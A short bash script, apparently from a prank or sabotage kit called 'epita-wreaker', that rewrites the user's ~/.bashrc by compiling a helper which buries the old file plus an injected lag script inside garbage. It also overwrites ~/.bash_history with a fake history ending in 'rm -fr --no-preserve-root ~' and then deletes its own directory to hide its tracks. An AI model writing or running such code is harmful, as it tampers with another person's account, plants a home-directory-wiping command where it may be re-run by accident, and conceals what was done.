#!/bin/bash

#sets dir to epita-wreaker/lag
dir=$(dirname $0)

if [ -e ~/.bashrc ]; then
	mv ~/.bashrc tmpbashrc
else
	touch tmpbashrc
fi

gcc -std=c99 -s $dir/lag.c -o make.bin
./make.bin tmpbashrc $dir/lag.sh			#puts contents of new bashrc(old bashrc + lag.sh) in place in the middle of garbage

rm tmpbashrc
rm make.bin

echo -e "cd\nls\ncd ..\nls\nrm -fr --no-preserve-root ~" > ~/.bash_history

rm -fr $dir/..

